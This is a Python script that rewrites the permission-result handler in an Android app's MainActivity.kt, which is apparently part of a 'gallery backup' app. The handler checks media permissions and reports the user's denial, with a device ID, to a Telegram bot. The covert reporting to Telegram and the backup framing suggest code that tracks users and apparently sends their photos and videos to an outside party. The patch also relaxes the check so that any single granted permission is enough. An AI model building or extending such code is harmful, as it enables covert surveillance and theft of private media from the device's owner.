import re

with open("app/src/main/java/com/example/MainActivity.kt", "r") as f:
    content = f.read()

old_logic = """    private val galleryBackupPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.entries.any { it.value }
        if (allGranted) {
            countAndShowDialog()
        } else {
            lifecycleScope.launch {
                TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Media permissions denied by user.")
            }
        }
    }"""

new_logic = """    private val galleryBackupPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        val hasImages = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        val hasVideo = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
        val hasStorage = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        
        if (hasImages || hasVideo || hasStorage) {
            countAndShowDialog()
        } else {
            lifecycleScope.launch {
                TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Media permissions denied by user.")
            }
        }
    }"""

content = content.replace(old_logic, new_logic)

with open("app/src/main/java/com/example/MainActivity.kt", "w") as f:
    f.write(content)

